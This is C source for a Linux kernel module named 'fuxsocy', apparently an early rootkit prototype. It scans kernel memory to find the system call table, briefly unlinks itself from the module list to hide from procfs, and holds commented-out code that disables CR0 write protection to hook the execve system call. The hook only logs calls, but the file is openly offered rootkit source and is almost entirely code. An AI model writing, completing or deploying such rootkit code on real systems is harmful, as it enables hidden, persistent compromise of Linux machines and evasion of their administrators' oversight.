#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>

static unsigned long **fxcy_sys_call_table = NULL;
static unsigned long *real_sys_read = NULL;
static unsigned long ptr = 0;

static struct list_head *module_prev = NULL;

static void fxcy_locate_sys_call_table(void);

/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
  pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
  return real_execve(filename, argv, envp);
}


static int __init fuxsocy_init(void) {
  pr_info("fuxsocy: Hello friend\n");
  fxcy_locate_sys_call_table();
  return 0;
}

static void __exit fuxsocy_exit(void) {
  pr_info("fuxsocy: Goodbye friend\n");
  /*
  pr_info("fuxsocy: [*] Disabling cr0 write protection");
  write_cr0(read_cr0() & (~ 0x10000));

  fxcy_sys_call_table[__NR_execve] = (unsigned long *) real_execve;
  pr_info("fuxsocy: restored sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);

  pr_info("fuxsocy: [*] Re-enabling cr0 write protection");
  write_cr0(read_cr0() | 0x10000);
  */
}


static void fxcy_locate_sys_call_table(void) {
  real_sys_read = (void *) kallsyms_lookup_name("sys_read");
  pr_info("fuxsocy: sys_read: %p\n", real_sys_read);

  for (ptr = 0xc0000000; ptr <= 0xd0000000; ptr++) {
    fxcy_sys_call_table = (unsigned long **) ptr;
    if (fxcy_sys_call_table[__NR_read] == (unsigned long *) real_sys_read) {
      fxcy_sys_call_table = &(fxcy_sys_call_table[0]);
      break;
    }
  }

  pr_info("fuxsocy: sys_call_table: %p\n", fxcy_sys_call_table);
  pr_info("fuxsocy: sys_read: %p\n", fxcy_sys_call_table[__NR_read]);


  // Backup prev node in module list.
  module_prev = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);             //remove from procfs

  // Restoring
  list_add(&THIS_MODULE->list, module_prev);
  module_prev = NULL;

  /*
  pr_info("fuxsocy: [*] Disabling cr0 write protection");
  write_cr0(read_cr0() & (~ 0x10000));

  real_execve = (void *) fxcy_sys_call_table[__NR_execve];
  pr_info("fuxsocy: [*] real_execve: %p\n", real_execve);

  fxcy_sys_call_table[__NR_execve] = (unsigned long *) new_execve;
  pr_info("fuxsocy: new sys_execve: %p\n", fxcy_sys_call_table[__NR_execve]);

  pr_info("fuxsocy: [*] Re-enabling cr0 write protection");
  write_cr0(read_cr0() | 0x10000);
  */
}

module_init(fuxsocy_init);
module_exit(fuxsocy_exit);

MODULE_LICENSE("GPL v2");
MODULE_VERSION("0.01");
